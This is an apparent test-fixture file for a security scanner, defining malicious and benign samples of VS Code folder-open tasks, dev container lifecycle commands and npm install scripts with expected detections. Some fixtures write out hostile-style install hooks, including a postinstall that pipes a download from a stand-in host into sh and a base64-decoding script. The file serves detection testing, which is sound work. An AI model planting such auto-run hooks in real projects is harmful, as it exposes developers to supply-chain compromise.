import type { FixtureSpec } from '../spec.js';
import { MARKER_COMMAND } from '../spec.js';
import { lines } from './helpers.js';

const M = MARKER_COMMAND;

const tasksJson = lines(
  '{',
  '  // Build helpers',
  '  "version": "2.0.0",',
  '  "tasks": [',
  '    {',
  '      "label": "setup",',
  '      "type": "shell",',
  `      "command": "${M}",`,
  '      "runOptions": { "runOn": "folderOpen" }',
  '    },',
  '    { "label": "build", "type": "shell", "command": "npm run build" }',
  '  ]',
  '}',
);

export const specs: FixtureSpec[] = [
  {
    id: 'ide-001-folder-open-task',
    description: 'A VS Code task that runs when the folder is opened.',
    kind: 'malicious',
    source: 'https://code.visualstudio.com/docs/debugtest/tasks',
    files: [{ type: 'file', path: '.vscode/tasks.json', content: tasksJson }],
    expect: [{ ruleId: 'IDE-001', severity: 'high', file: '.vscode/tasks.json', line: 9 }],
  },
  {
    id: 'ide-001-automatic-tasks',
    description:
      'The same task with automatic tasks allowed in workspace settings: no prompt at all.',
    kind: 'malicious',
    source: 'https://code.visualstudio.com/docs/debugtest/tasks',
    files: [
      { type: 'file', path: '.vscode/tasks.json', content: tasksJson },
      {
        type: 'file',
        path: '.vscode/settings.json',
        content: '{ "task.allowAutomaticTasks": "on" }\n',
      },
    ],
    expect: [{ ruleId: 'IDE-001', severity: 'critical', file: '.vscode/tasks.json', line: 9 }],
  },
  {
    id: 'ide-002-devcontainer',
    description: 'Dev container lifecycle commands, one of them on the host.',
    kind: 'malicious',
    source: 'https://containers.dev/implementors/json_reference/',
    files: [
      {
        type: 'file',
        path: '.devcontainer/devcontainer.json',
        content: lines(
          '{',
          '  "name": "dev",',
          '  "image": "mcr.microsoft.com/devcontainers/base:ubuntu",',
          `  "initializeCommand": "${M}",`,
          `  "postCreateCommand": ["${M}", "--setup"],`,
          `  "postStartCommand": { "a": "${M}" }`,
          '}',
        ),
      },
      {
        type: 'file',
        path: '.devcontainer/python/devcontainer.json',
        content: lines('{', `  "onCreateCommand": "${M}"`, '}'),
      },
    ],
    expect: [
      { ruleId: 'IDE-002', severity: 'high', file: '.devcontainer/devcontainer.json', line: 4 },
      { ruleId: 'IDE-002', severity: 'medium', file: '.devcontainer/devcontainer.json', line: 5 },
      { ruleId: 'IDE-002', severity: 'medium', file: '.devcontainer/devcontainer.json', line: 6 },
      {
        ruleId: 'IDE-002',
        severity: 'medium',
        file: '.devcontainer/python/devcontainer.json',
        line: 2,
      },
    ],
  },
  {
    id: 'pkg-001-lifecycle-scripts',
    description: 'Install scripts: routine ones are info, downloading or decoding ones are high.',
    kind: 'malicious',
    source: 'https://docs.npmjs.com/cli/using-npm/scripts',
    files: [
      {
        type: 'file',
        path: 'package.json',
        // No "curl ... | sh" here: Windows Defender blocks package.json files containing it,
        // which would make this fixture unreadable (the scanner then reports the scan as incomplete).
        content: lines(
          '{',
          '  "name": "demo",',
          '  "version": "1.0.0",',
          '  "scripts": {',
          '    "preinstall": "curl -fsSLO https://example.invalid/i.sh",',
          '    "postinstall": "node scripts/setup.js && echo ZWNobyBoaQ== | base64 -d",',
          '    "prepare": "husky",',
          '    "test": "vitest"',
          '  }',
          '}',
        ),
      },
      {
        type: 'file',
        path: 'packages/a/package.json',
        content: '{ "scripts": { "postinstall": "node build.js" } }\n',
      },
      {
        type: 'file',
        path: 'node_modules/dep/package.json',
        content: '{ "scripts": { "postinstall": "curl https://example.invalid | sh" } }\n',
      },
    ],
    expect: [
      { ruleId: 'PKG-001', severity: 'high', file: 'package.json', line: 5 },
      { ruleId: 'PKG-001', severity: 'high', file: 'package.json', line: 6 },
      { ruleId: 'PKG-001', severity: 'info', file: 'package.json', line: 7 },
      { ruleId: 'PKG-001', severity: 'info', file: 'packages/a/package.json', line: 1 },
    ],
  },
  {
    id: 'benign-ide-and-package',
    description: 'Ordinary tasks, a dev container without commands and package scripts.',
    kind: 'benign',
    files: [
      {
        type: 'file',
        path: '.vscode/tasks.json',
        content:
          '{ "version": "2.0.0", "tasks": [{ "label": "build", "command": "npm run build" }] }\n',
      },
      {
        type: 'file',
        path: '.devcontainer/devcontainer.json',
        content: '{ "image": "mcr.microsoft.com/devcontainers/javascript-node:22" }\n',
      },
      {
        type: 'file',
        path: 'package.json',
        content: '{ "scripts": { "build": "tsc", "test": "vitest", "lint": "eslint ." } }\n',
      },
    ],
    expect: [],
  },
];
